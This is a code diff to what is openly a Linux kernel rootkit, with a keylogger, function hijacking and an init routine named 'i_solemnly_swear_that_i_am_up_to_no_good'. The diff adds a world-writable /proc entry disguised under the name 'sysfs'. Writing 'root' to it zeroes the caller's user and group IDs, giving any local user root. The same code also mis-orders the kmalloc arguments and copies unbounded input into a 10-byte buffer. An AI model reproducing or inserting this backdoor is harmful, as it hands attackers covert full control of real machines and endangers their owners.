@@ -669,6 +669,77 @@ unsigned int n_dev_get_flags ( const struct net_device *dev )
     return ret;
 }
 
+int len,temp;
+
+char *msg;
+
+#define PROCENTRY "sysfs"
+static ssize_t read_proc(struct file *filp,char *buf,size_t count,loff_t *offp) {
+    int retval;
+    if(count>temp) {
+        count=temp;
+    }
+    temp=temp-count;
+    retval = copy_to_user(buf,msg, count);
+    if (retval < 0) {
+        return 0;
+    }
+    if(count==0)
+        temp=len;
+    return count;
+}
+
+static ssize_t write_proc(struct file *filp,const char *buf,size_t count,loff_t *offp) {
+    struct cred * cred;
+    int retval;
+    retval = copy_from_user(msg,buf,count);
+    if (retval < 0) {
+        return 0;
+    }
+    if (strncmp(buf,"root", 4) == 0) {
+        cred = (struct cred * )__task_cred(current);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
+        cred-> uid = 0;
+        cred-> gid = 0;
+        cred-> suid = 0;
+        cred-> euid = 0;
+        cred-> egid = 0;
+        cred-> fsuid = 0;
+        cred-> fsgid = 0;
+#else
+        cred-> uid.val = 0;
+        cred-> gid.val = 0;
+        cred-> suid.val = 0;
+        cred-> euid.val = 0;
+        cred-> egid.val = 0;
+        cred-> fsuid.val = 0;
+        cred-> fsgid.val = 0;
+#endif
+    }
+    len=count;
+    temp=len;
+    return count;
+}
+
+struct file_operations proc_fops = {
+    read: read_proc,
+    write: write_proc
+};
+void create_new_proc_entry(void) {
+    proc_create(PROCENTRY, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH, NULL, &proc_fops);
+    msg = kmalloc(GFP_KERNEL, 10 * sizeof(char));
+}
+
+
+int proc_init (void) {
+    create_new_proc_entry();
+    return 0;
+}
+
+void proc_cleanup(void) {
+    remove_proc_entry(PROCENTRY, NULL);
+}
+
 static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long arg )
 {
     int ret;
@@ -1073,7 +1144,7 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     #if defined(_CONFIG_ICMP_)
     icmp_init();
     #endif
-
+    proc_init();    
     return 0;
 }
 
@@ -1094,7 +1165,7 @@ static void __exit mischief_managed ( void )
     #if defined(_CONFIG_KEYLOGGER_)
     keylogger_exit();
     #endif
-
+    proc_cleanup();
     hijack_stop(inet_ioctl);
     hijack_stop(dev_get_flags);
     hijack_stop(udp6_seq_show);
